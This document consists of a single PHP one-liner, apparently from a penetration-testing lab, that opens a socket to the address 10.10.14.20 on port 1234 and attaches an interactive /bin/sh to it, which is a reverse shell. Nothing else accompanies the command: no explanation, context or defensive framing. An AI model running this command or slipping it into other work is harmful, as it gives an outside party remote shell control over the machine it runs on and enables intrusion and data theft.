php -r '$sock=fsockopen("10.10.14.20",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
